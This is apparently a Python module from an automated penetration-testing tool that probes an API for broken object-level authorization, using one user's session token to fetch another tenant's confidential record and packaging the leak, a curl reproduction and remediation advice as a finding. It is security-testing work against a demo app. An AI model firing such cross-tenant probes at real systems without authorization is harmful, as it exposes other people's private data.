"""HawkScan Exploitation Agent: Broken Object Level Authorization (IDOR / BOLA)
Tests for unauthorized cross-tenant object access and generates live proof.
"""

import httpx
from urllib.parse import urljoin
from typing import Dict, Any, Optional, Callable


class IdorExploitAgent:
    """Exploitation agent targeting parameter-based object reference flaws (OWASP API1 / CWE-639)."""

    def __init__(self, target_url: str, emit_fn: Optional[Callable[[str, str], Any]] = None):
        self.target_url = target_url.rstrip("/")
        self.emit_fn = emit_fn

    def log(self, msg: str):
        if self.emit_fn:
            self.emit_fn("exploitation", msg)

    async def execute_exploit(self, session: Dict[str, Any], static_surface: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Attempts to access another tenant's private record using an active user session."""
        self.log("BOLA/IDOR Agent: Formulating cross-tenant access exploit against /api/records/{id}...")

        token = session.get("token")
        cookies = session.get("cookies", {})
        headers = {"User-Agent": "HawkScan-AI-Pentester/1.0"}
        if token:
            headers["Authorization"] = f"Bearer {token}"

        # Target Bob's confidential record (REC-9001) using Alice's session
        target_record_id = "REC-9001"
        exploit_url = urljoin(self.target_url, f"/api/records/{target_record_id}")

        repro_curl = (
            f"curl -X GET '{exploit_url}' \\\n"
            f"  -H 'Authorization: Bearer {token or 'SESSION_TOKEN'}' \\\n"
            f"  -H 'Accept: application/json'"
        )

        self.log(f"Firing exploit probe -> GET {exploit_url} with Alice's credentials...")

        async with httpx.AsyncClient(timeout=5.0, verify=False) as client:
            try:
                resp = await client.get(exploit_url, headers=headers, cookies=cookies)
                
                # Check if exploit succeeded (HTTP 200 and confidential data leaked)
                if resp.status_code == 200:
                    body = resp.json()
                    # Verify unauthorized data disclosure
                    is_leak = (
                        body.get("owner_id") != 1 or
                        "CONFIDENTIAL" in str(body) or
                        body.get("security_warning") == "DATA_LEAK_CONFIRMED"
                    )

                    if is_leak:
                        self.log("BOLA/IDOR EXPLOIT CONFIRMED: Successfully retrieved Bob's confidential M&A records!")
                        return {
                            "vulnerability_id": "HAWKSCAN-BOLA-001",
                            "title": "Broken Object Level Authorization (IDOR / BOLA)",
                            "severity": "CRITICAL",
                            "cwe_id": "CWE-639",
                            "owasp_category": "A01:2021-Broken Access Control",
                            "target_endpoint": f"/api/records/{target_record_id}",
                            "http_method": "GET",
                            "status": "VERIFIED_EXPLOIT",
                            "description": (
                                "User Alice Johnson successfully retrieved confidential corporate acquisition records "
                                "(REC-9001) belonging to Robert (Bob) Chen without ownership verification."
                            ),
                            "proof_of_concept": {
                                "exploit_command": repro_curl,
                                "http_status": resp.status_code,
                                "leaked_payload": body,
                                "evidence_summary": f"Retrieved Record ID {body.get('id')} (Amount: ${body.get('amount'):,}) belonging to Owner ID {body.get('owner_id')}."
                            },
                            "remediation": {
                                "target_file": "target_app/routes/records.py",
                                "guidance": "Enforce object-level tenancy checks (e.g. record.owner_id == current_user.id) before returning record data."
                            }
                        }
                elif resp.status_code == 403:
                    self.log("BOLA/IDOR exploit blocked by server (HTTP 403 Forbidden).")
                else:
                    self.log(f"BOLA/IDOR probe returned HTTP {resp.status_code}.")

            except Exception as e:
                self.log(f"BOLA/IDOR exploit attempt encountered error: {e}")

        return None
